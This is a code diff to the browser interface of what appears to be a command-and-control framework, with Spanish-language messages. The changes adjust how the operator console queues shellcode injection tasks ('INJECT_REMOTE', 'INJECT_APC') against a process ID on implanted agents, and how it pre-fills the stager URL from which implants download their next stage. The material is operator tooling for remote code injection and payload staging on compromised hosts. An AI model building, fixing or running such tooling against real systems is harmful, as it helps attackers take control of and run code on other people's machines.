@@ -4977,6 +4977,9 @@ async function api(method, path, body, raw=false) {
   const resp = await fetch(BASE + path, opts);
   if (raw) return resp;
   const json = await resp.json();
+  if (resp.status === 401 && json?.error === 'unauthorized') {
+    toast('Sesión GUI expirada — recarga la página (F5)', 'error', 6000);
+  }
   return json;
 }
 
@@ -10136,7 +10139,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
         const sc = await fetchSCFile(parts6[1]);
         payload = u8ToB64(sc);
         taskType = 'INJECT_REMOTE';
-        taskArgs = pid;
+        taskArgs = JSON.stringify({pid: parseInt(pid, 10)});
       } catch(e) { addConsoleOutput('', e.message, null); return; }
       break;
     }
@@ -10825,6 +10828,10 @@ function setPayMode(mode) {
     document.getElementById('mc-'+m).classList.toggle('active', m === mode);
   });
   if (mode === 'delivery') dlvUpdateTunnelBanner();
+  if (mode === 'stager') {
+    const el = document.getElementById('stager-stage-url');
+    if (el && !el.value) stagerFillFromTunnel();
+  }
 }
 
 function setImplantFmt(fmt) {
@@ -11543,13 +11550,24 @@ function payFillStagerURL() {
 }
 
 function stagerFillFromTunnel() {
-  const url = stagerState?.public_url;
-  if (url) {
-    const el = document.getElementById('stager-stage-url');
-    if (el) el.value = url;
+  const el = document.getElementById('stager-stage-url');
+  if (!el) return;
+  // Prefer active tunnel URL
+  if (stagerState?.public_url) {
+    el.value = stagerState.public_url;
     toast('Stage URL filled from active tunnel');
+    return;
+  }
+  // Fallback: construct from builder host/port/transport
+  const host = document.getElementById('pay-host')?.value.trim();
+  const port = document.getElementById('pay-port')?.value.trim() || '8443';
+  const transport = document.getElementById('pay-transport')?.value || 'https';
+  if (host) {
+    const scheme = (transport === 'mtls' || transport === 'https' || transport === 'tcp') ? 'https' : 'http';
+    el.value = `${scheme}://${host}:${port}/stage/TOKEN`;
+    toast('Stage URL pre-filled — sustituye TOKEN por el token real', 'yellow');
   } else {
-    toast('No active tunnel — start one in the Stager tab', 'error');
+    toast('No hay tunnel activo ni host configurado — rellena el Host y pulsa ↙', 'error');
   }
 }
 
@@ -13602,7 +13620,7 @@ async function injectWithFile(filename) {
     const sc = await fetchSCFile(filename);
     const b64 = u8ToB64(sc);
     const type = mode==='remote' ? 'INJECT_REMOTE' : 'INJECT_APC';
-    const taskArgs = mode==='remote' ? pid : '';
+    const taskArgs = JSON.stringify({pid: parseInt(pid, 10)});
     const r = await api('POST', `/api/agents/${agentId}/task`, {type, args:taskArgs, payload:b64});
     if (r?.ok) {
       toast(type + ' queued via ' + filename);
